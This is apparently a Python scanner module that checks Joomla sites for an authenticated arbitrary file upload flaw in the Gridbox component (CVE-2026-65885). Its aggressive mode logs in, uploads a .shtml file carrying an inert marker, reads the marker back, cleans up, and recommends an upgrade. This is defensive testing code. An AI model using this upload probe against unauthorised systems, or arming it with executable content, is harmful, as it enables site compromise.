from __future__ import annotations

from typing import Any

from ...core.http import (
    HttpClient,
    build_multipart,
    is_transport_error,
    normalize_url,
    transport_error_detail,
)
from ...core.models import Finding
from . import gridbox_common as gb

CVE_ID = "CVE-2026-65885"
NAME = "Gridbox authenticated arbitrary file upload"
COMPONENT = "Gridbox (com_gridbox)"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["aggressive"]
AFFECTED_JOOMLA_VERSIONS = ["*"]
AFFECTED_RULE = "Gridbox 1.0.0 through 2.20.1"
FIXED_RULE = "Gridbox 2.20.2 or later"
UPLOAD_PATH = "/index.php?option=com_gridbox&task=uploader.executeAction&action=uploadFile&path=images"
DELETE_PATH = "/index.php?option=com_gridbox&task=uploader.executeAction&action=contextDelete&path="


def run_aggressive_probe(
    target_url: str,
    timeout: int = 12,
    proxy: str | None = None,
    admin_user: str | None = None,
    admin_password: str | None = None,
) -> Finding:
    base = normalize_url(target_url)
    if not admin_user or not admin_password:
        return Finding(
            cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=False,
            proof_url=f"{base}{UPLOAD_PATH}",
            detail=(
                "The probe needs a frontend account with core.create on com_gridbox via "
                "--aggressive-arg admin_user=... admin_password=...; nothing was sent."
            ),
            action="Re-run with lab backend credentials on an authorized target.",
        )
    client = HttpClient(timeout=timeout, proxy=proxy)
    preflight = client.get(f"{base}/", timeout=timeout)
    if is_transport_error(preflight):
        return Finding(
            cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True, proof_url=f"{base}/",
            detail=f"The target could not be reached ({transport_error_detail(preflight)}).",
            action="Retry when the target is reachable.",
        )
    if not gb.frontend_login(client, base, admin_user, admin_password, timeout):
        return Finding(
            cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True,
            proof_url=f"{base}{UPLOAD_PATH}",
            detail="The frontend login form was not available, so no upload was attempted.",
            action="Verify the frontend login route and credentials.",
        )
    name = f"gb65885_{gb.random_suffix()}.shtml"
    marker = f"GB_UPLOAD_65885_{gb.random_suffix(6)}"
    content_type, payload = build_multipart(
        {"action": "uploadFile", "path": "images"},
        {"file": (name, marker.encode(), "text/plain")},
    )
    upload = client.request(
        f"{base}{UPLOAD_PATH}", method="POST",
        headers={"Content-Type": content_type}, data=payload,
        timeout=timeout, follow_redirects=False,
    )
    uploaded = gb.json_body(upload)
    stored_name = uploaded.get("name") or name
    url = uploaded.get("url") or f"images/{stored_name}"
    readback = client.get(f"{base}/{url}", timeout=timeout)
    readback_hit = marker in (readback.get("body", "") or "")
    # Best-effort cleanup with the same authenticated session.
    client.request(
        f"{base}{DELETE_PATH}images/{stored_name}",
        method="POST", headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=b"", timeout=timeout, follow_redirects=False,
    )
    evidence: dict[str, object] = {
        "uploaded_name": stored_name,
        "upload_status": upload.get("status"),
        "upload_accepted": bool(uploaded.get("name")) or readback_hit,
        "public_url": url,
        "readback_status": readback.get("status"),
        "marker_read_back": readback_hit,
    }
    if readback_hit:
        return Finding(
            cve=CVE_ID, name=NAME, status="VULNERABLE", confidence="CONFIRMED",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True,
            proof_url=f"{base}/{url}",
            evidence=evidence,
            detail=(
                "An authenticated account with core.create uploaded a .shtml file with no extension "
                "allow-list check; the inert marker was served back from the public images directory. "
                "The uploaded content is inert; execution depends on the server's handler/SSI "
                "configuration, so the lab ceiling is VULNERABLE_UPLOAD_ONLY."
            ),
            action=(
                "Upgrade Gridbox to 2.20.2 or later (File::canUploadFile/safeUpload) and remove "
                "unexpected files from the upload directory."
            ),
        )
    return Finding(
        cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM",
        component=COMPONENT, affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT, exploit_ran=True,
        proof_url=f"{base}{UPLOAD_PATH}",
        evidence=evidence,
        detail=(
            "The upload did not store a readable file "
            f"(accepted={bool(uploaded.get('name'))}, readback={readback.get('status')})."
        ),
        action="Verify Gridbox runs 2.20.2 or later.",
    )


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    plugins: dict | None = None,
    **kwargs: Any,
) -> Finding:
    result = gb.passive_gridbox(
        plugins,
        cve=CVE_ID, name=NAME, component=COMPONENT, affected_rule=AFFECTED_RULE,
        fixed_rule=FIXED_RULE, fixed="2.20.2",
        affected_detail="Gridbox is in the affected range; verify the authenticated uploader accepts dangerous extensions.",
        patched_detail="Gridbox validates extension, MIME and content before storing uploads.",
        action="Upgrade Gridbox to 2.20.2 or later and audit upload directories.",
    )
    if not run_exploit_check:
        return result
    if exploit_mode != "aggressive":
        result.detail += " This CVE requires an aggressive lab-only upload proof."
        return result
    if result.status not in {"LIKELY_VULNERABLE", "INCONCLUSIVE"}:
        return result
    args = aggressive_args or {}
    probe = run_aggressive_probe(
        target_url, timeout=timeout, proxy=proxy,
        admin_user=args.get("admin_user"),
        admin_password=args.get("admin_password"),
    )
    probe.component_version = result.component_version
    return probe


def affects_joomla_version(joomla_version: str | None) -> bool:
    return True


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT,
        "affected_rule": AFFECTED_RULE, "affected_joomla_versions": AFFECTED_JOOMLA_VERSIONS,
        "exploit_available": HAS_EXPLOIT, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE,
        "vulnerability_type": "Unrestricted File Upload",
        "module_version": "1.0.0", "last_reviewed": "2026-11-11", "updated": "2026-11-11",
        "required_detectors": ["gridbox"],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2026-65885",
            "https://mysites.guru/blog/gridbox-23-critical-vulnerabilities/",
        ],
    }
